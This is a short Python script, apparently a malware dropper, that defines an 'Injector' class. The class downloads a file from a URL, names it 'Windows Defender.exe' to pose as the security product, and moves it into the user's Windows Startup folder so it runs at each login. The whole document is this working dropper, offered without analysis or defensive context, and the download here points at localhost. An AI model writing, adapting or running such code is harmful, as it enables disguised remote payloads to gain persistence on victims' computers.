import getpass, shutil
import requests, os

class Injector:
    def __init__(self) -> None:
        self.path = f"C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        pass

    def download(self, url: str) -> None:
        try:
            r = requests.get(url)
            
            if r.status_code == 200:

                with open("Windows Defender.exe", "wb") as f:
                    f.write(r.content)
                    
                shutil.move("Windows Defender.exe", self.path)
        except requests.exceptions.ConnectionError:
            pass
        pass


if __name__ == "__main__":
    inj = Injector()
    inj.download("http://localhost:5000/download")